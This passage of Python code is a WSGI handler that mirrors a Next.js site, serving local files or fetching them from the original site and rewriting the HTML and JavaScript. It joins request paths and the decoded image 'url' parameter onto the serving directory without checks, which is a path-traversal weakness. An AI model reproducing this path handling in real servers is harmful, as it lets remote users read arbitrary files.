                        image_url = urllib.parse.unquote(query_params['url'][0])
                        if image_url.startswith('/'):
                            image_url = image_url[1:]
                        
                        # Try to find the image locally
                        local_image_path = os.path.join(self.directory, image_url)
                        logger.info(f"Looking for image at: {local_image_path}")
                        
                        if os.path.exists(local_image_path):
                            with open(local_image_path, 'rb') as f:
                                content = f.read()
                                content_type = mimetypes.guess_type(local_image_path)[0] or 'image/webp'
                                headers.append(('Content-type', content_type))
                                start_response('200 OK', headers)
                                return [content]
                        
                        # If not found locally, try to fetch from original site
                        url = urljoin(ORIGINAL_SITE, image_url)
                        logger.info(f"Fetching image from original site: {url}")
                        response = requests.get(url, timeout=10)
                        if response.status_code == 200:
                            content = response.content
                            content_type = response.headers.get('Content-Type', 'image/webp')
                            headers.append(('Content-type', content_type))
                            start_response('200 OK', headers)
                            return [content]
                    
                    # If we get here, we couldn't handle the image request
                    logger.warning(f"Could not process Next.js image request: {path}?{query_string}")
                    start_response('200 OK', [('Content-Type', 'image/webp')])
                    # Return an empty pixel instead of a 400
                    return [b'']
                except Exception as e:
                    logger.error(f"Error processing Next.js image: {str(e)}")
                    logger.error(traceback.format_exc())
                    start_response('200 OK', [('Content-Type', 'image/webp')])
                    # Return an empty pixel instead of a 500
                    return [b'']
            
            # Handle the regular GET request
            if method == 'GET':
                # Try to serve local file first
                local_path = os.path.join(self.directory, path[1:] if path.startswith('/') else path)
                
                # If path is a directory, try to serve index.html
                if os.path.isdir(local_path):
                    index_path = os.path.join(local_path, 'index.html')
                    if os.path.exists(index_path):
                        local_path = index_path
                    else:
                        # If no index.html, list directory contents
                        start_response('403 Forbidden', [('Content-Type', 'text/plain')])
                        return [b'Directory listing not allowed']
                
                if os.path.exists(local_path) and not os.path.isdir(local_path):
                    with open(local_path, 'rb') as f:
                        content = f.read()
                    content_type = mimetypes.guess_type(local_path)[0] or 'application/octet-stream'
                    headers.append(('Content-type', content_type))
                    
                    # Process HTML content with all fixes
                    if content_type and content_type.startswith('text/html'):
                        content = self.process_html_content(content, host_url)
                    # Modify JavaScript files
                    elif content_type and content_type.startswith('application/javascript'):
                        content = self.modify_chunk_content(content)
                        
                    start_response('200 OK', headers)
                    return [content]
                
                # Handle Next.js static files
                if path.startswith('/_next/static'):
                    # Try to fetch from original site
                    url = urljoin(ORIGINAL_SITE, path)
                    try:
                        logger.info(f"Fetching Next.js static file: {url}")
                        response = requests.get(url, timeout=10)
                        if response.status_code == 200:
                            content = response.content
                            content_type = response.headers.get('Content-Type', 'application/javascript' if path.endswith('.js') else 'text/css')
                            headers.append(('Content-type', content_type))
                            
                            # Modify chunk files if they are JavaScript
                            if path.endswith('.js'):
                                content = self.modify_chunk_content(content)
                                
                            start_response('200 OK', headers)
                            return [content]
                    except Exception as e:
                        logger.error(f"Error fetching Next.js static file: {str(e)}")
                        # Rather than returning an error, return an empty file
                        start_response('200 OK', [('Content-Type', 'application/javascript')])
                        return [b'']
                
                # If local file not found, fetch from original site
                url = urljoin(ORIGINAL_SITE, path)
                try:
                    response = requests.get(url, timeout=10)
                    if response.status_code == 200:
                        content = response.content
                        content_type = response.headers.get('Content-Type', 'application/octet-stream')
                        headers.append(('Content-type', content_type))
                        
                        # Process HTML content with all fixes
                        if content_type and content_type.startswith('text/html'):
                            content = self.process_html_content(content, host_url)
                        # Process JavaScript content
                        elif content_type and content_type.startswith('application/javascript'):
                            content = self.modify_chunk_content(content)
                            
                        start_response('200 OK', headers)
                        return [content]
                    else:
                        start_response('200 OK', [('Content-Type', 'text/plain')])
                        return [b'Not Found']
                except Exception as e:
                    logger.error(f"Error fetching from original site: {str(e)}")
                    start_response('200 OK', [('Content-Type', 'text/plain')])
                    return [b'']
            else:
                # Handle HEAD requests for CORS checks
                if method == 'HEAD':
                    start_response('200 OK', [
                        ('Content-Type', 'text/plain'),
                        ('Access-Control-Allow-Origin', '*'),
                        ('Access-Control-Allow-Methods', 'GET, HEAD, OPTIONS'),
                        ('Access-Control-Allow-Headers', '*'),
                        ('Cross-Origin-Opener-Policy', 'same-origin')
                    ])
                    return [b'']
                    
                start_response('200 OK', [('Content-Type', 'text/plain')])
                return [b'Method Not Allowed']
            
        except Exception as e:
            logger.error(f"Error handling request: {str(e)}")
            logger.error(traceback.format_exc())
            start_response('200 OK', [('Content-Type', 'text/plain')])
            return [b'']

    def fix_css_keyframes(self, content):
        """Fix CSS keyframe animation syntax errors."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Fix "@keyframes" with extra @ symbol
        content = re.sub(r'@@keyframes', '@keyframes', content)
        
        # Fix keyframe percentages followed by colon without space and brace
        content = re.sub(r'(\d+)%:', r'\1% {', content)
        
        # Fix where the colon is right next to the brace
        content = re.sub(r'(\d+)%:({)', r'\1% \2', content)
        
        # Fix missing space between percentage and opening brace
        content = re.sub(r'(\d+)%({)', r'\1% \2', content)
        
        # Fix missing space after "from" keyword
        content = re.sub(r'from:', r'from {', content)
        
        # Fix missing space after "to" keyword
        content = re.sub(r'to:', r'to {', content)
        
        # Fix extra closing braces
        content = re.sub(r'}\s*}\s*}', '}}', content)
        
        # Fix missing closing brace at the end of keyframes
        content = re.sub(r'(@keyframes[^}]+})(?!\s*})', r'\1}', content)
        
        return content.encode('utf-8')
    
    def process_html_content(self, content, host_url):
        """Process HTML content with all fixes before serving."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Apply all fixes in sequence
        content = self.remove_tracking_scripts(content).decode('utf-8', errors='ignore')
        content = self.fix_css_keyframes(content).decode('utf-8', errors='ignore')
        content = self.rewrite_urls(content).decode('utf-8', errors='ignore')
        content = self.modify_html_content(content).decode('utf-8', errors='ignore')
        content = self.modify_html_text(content).decode('utf-8', errors='ignore')
        content = self.inject_load_complete_script(content).decode('utf-8', errors='ignore')
        
        return content.encode('utf-8')

# Create WSGI application
wsgi_app = WSGIHandler()

# For local testing with the built-in server
if __name__ == "__main__":
    from wsgiref.simple_server import make_server
    port = int(os.environ.get("PORT", 8000))
    httpd = make_server('', port, wsgi_app)
    print(f"Serving on port {port}...")
    httpd.serve_forever()